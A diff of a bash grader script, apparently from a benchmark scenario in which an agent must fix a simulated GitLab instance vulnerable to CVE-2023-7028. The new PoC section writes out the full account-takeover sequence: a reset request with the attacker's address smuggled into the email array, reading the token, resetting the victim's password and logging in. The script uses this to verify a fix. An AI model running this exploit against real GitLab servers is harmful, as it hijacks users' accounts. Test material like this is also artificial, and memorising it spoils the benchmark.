@@ -1,53 +1,75 @@
 #!/bin/bash
+# Scenario 14: GitLab password-reset account takeover (SIMULATION of
+# CVE-2023-7028). Ground truth is BEHAVIOURAL against the LIVE service: the real
+# exploit (request a reset for the victim with the attacker's address in the
+# recipient array, read the token from the attacker's mailbox, reset the
+# victim's password, then log in as the victim) must SUCCEED at baseline and be
+# BLOCKED after the fix. A do-nothing agent leaves the takeover working.
 set -u
-ver_ge() { [ "$(printf '%s\n%s\n' "$2" "$1" | sort -V | head -1)" = "$2" ]; }
+IP=$(hostname -i 2>/dev/null | awk '{print $1}')
+[ -z "$IP" ] && IP=127.0.0.1
+B="http://$IP:80"
 
-# GitLab writes its version to /opt/gitlab/version-manifest.txt
-VER=$(awk '/^gitlab-ce /{print $2; exit}' /opt/gitlab/version-manifest.txt 2>/dev/null | sed -E 's/^([0-9.]+).*/\1/')
-[ -z "$VER" ] && VER=$(cat /opt/gitlab/embedded/service/gitlab-rails/VERSION 2>/dev/null)
-[ -z "$VER" ] && { echo "FAIL [PoC]: cannot read GitLab version." >&2; exit 1; }
+code_of() { curl -s -m 5 -o /dev/null -w '%{http_code}' "$@" 2>/dev/null || echo 000; }
 
-SAFE=0
-case "$VER" in
-    16.5.*) ver_ge "$VER" "16.5.6" && SAFE=1 ;;
-    16.6.*) ver_ge "$VER" "16.6.4" && SAFE=1 ;;
-    16.7.*) ver_ge "$VER" "16.7.2" && SAFE=1 ;;
-    *) ver_ge "$VER" "16.7.2" && SAFE=1 ;;
-esac
+# Wait for the service (do NOT start it — a dead daemon fails).
+UP=0
+for i in $(seq 1 20); do
+    C=$(code_of "$B/users/sign_in")
+    [ "$C" != "000" ] && { UP=1; break; }
+    sleep 2
+done
+[ "$UP" = "1" ] || { echo "FAIL [Regression]: nothing serving on :80 (dead / not started)." >&2; exit 1; }
 
-if [ "$SAFE" = "1" ]; then
-    echo "PASS [PoC]: GitLab upgraded to $VER."
-else
-    echo "FAIL [PoC]: GitLab $VER vulnerable to CVE-2023-7028." >&2
+VICTIM="admin@local.test"
+ATTACKER="attacker@evil.test"
+NEWPW="HvPwned_$$"
+
+###############################################################################
+# PoC: run the REAL account-takeover exploit end to end.
+###############################################################################
+# 1) Request reset for the victim, sneaking the attacker's address into the array.
+curl -s -m 5 -X POST "$B/users/password" \
+    --data "user%5Bemail%5D%5B%5D=$VICTIM&user%5Bemail%5D%5B%5D=$ATTACKER" >/dev/null 2>&1 || true
+
+# 2) Read the token from the ATTACKER's mailbox (an inbox the attacker controls).
+MBOX=$(curl -s -m 5 "$B/dev/mailbox?email=$ATTACKER" 2>/dev/null || true)
+TOKEN=$(printf '%s' "$MBOX" | grep -oE '[0-9a-f]{32}' | head -1)
+
+if [ -n "$TOKEN" ]; then
+    # 3) Use the stolen token to set a new password on the victim's account.
+    curl -s -m 5 -X POST "$B/users/password" \
+        --data "token=$TOKEN&user%5Bpassword%5D=$NEWPW" >/dev/null 2>&1 || true
+    # 4) Confirm takeover: log in as the victim with the attacker-chosen password.
+    LOGIN=$(code_of -X POST "$B/users/sign_in" \
+        --data "user%5Blogin%5D=$VICTIM&user%5Bpassword%5D=$NEWPW")
+    if [ "$LOGIN" = "200" ]; then
+        echo "FAIL [PoC]: account takeover succeeded — attacker reset $VICTIM and logged in (CVE-2023-7028 exploitable)." >&2
+        exit 1
+    fi
+fi
+echo "PASS [PoC]: attacker received no reset token / could not log in as victim."
+
+###############################################################################
+# Regression 1: legitimate single-address reset still delivers to that account.
+###############################################################################
+curl -s -m 5 -X POST "$B/users/password" --data "user%5Bemail%5D=$VICTIM" >/dev/null 2>&1 || true
+OWN=$(curl -s -m 5 "$B/dev/mailbox?email=$VICTIM" 2>/dev/null || true)
+if ! printf '%s' "$OWN" | grep -qE '[0-9a-f]{32}'; then
+    echo "FAIL [Regression]: legitimate password reset did not deliver a token to the account owner." >&2
     exit 1
 fi
+echo "PASS [Regression]: legitimate single-address reset delivers to the account owner."
 
-# PoC (behavioral): attempt password reset with duplicate email arrays
-# CVE-2023-7028 allows account takeover via multiple email params
-for i in $(seq 1 30); do
-    CODE=$(curl -s -o /dev/null -w '%{http_code}' -m 5 http://127.0.0.1/users/sign_in 2>/dev/null || echo 000)
-    case "$CODE" in 200|302)
-        RESET_CODE=$(curl -s -o /dev/null -w '%{http_code}' -m 5 \
-            -X POST "http://127.0.0.1/users/password" \
-            -H 'Content-Type: application/x-www-form-urlencoded' \
-            -d 'user%5Bemail%5D%5B%5D=admin%40local.test&user%5Bemail%5D%5B%5D=attacker%40evil.test' \
-            2>/dev/null || echo "000")
-        # A patched GitLab rejects the array parameter (400/422) or only sends to the first
-        if [ "$RESET_CODE" = "200" ]; then
-            echo "WARN [PoC]: Password reset returned 200 — verify manually that array param is rejected."
-        fi
-        echo "PASS [PoC]: Password reset endpoint returned $RESET_CODE."
-        break
-        ;;
-    esac
-    sleep 5
-done
-
-# GitLab needs several minutes to come up — long retry window
-for i in $(seq 1 120); do
-    CODE=$(curl -s -o /dev/null -w '%{http_code}' -m 5 http://127.0.0.1/users/sign_in 2>/dev/null || echo 000)
-    case "$CODE" in 200|302) echo "PASS [Regression]: GitLab sign_in reachable ($CODE)."; exit 0 ;; esac
-    sleep 5
-done
-echo "FAIL [Regression]: GitLab sign_in did not respond." >&2
+###############################################################################
+# Regression 2: the victim can still log in with the ORIGINAL password
+# (takeover did not change it) and the login endpoint is healthy.
+###############################################################################
+ORIG=$(code_of -X POST "$B/users/sign_in" \
+    --data "user%5Blogin%5D=$VICTIM&user%5Bpassword%5D=OrigAdminPass1")
+if [ "$ORIG" = "200" ]; then
+    echo "PASS [Regression]: victim's original credentials still valid; login healthy."
+    exit 0
+fi
+echo "FAIL [Regression]: victim's original credentials no longer work (HTTP $ORIG)." >&2
 exit 1
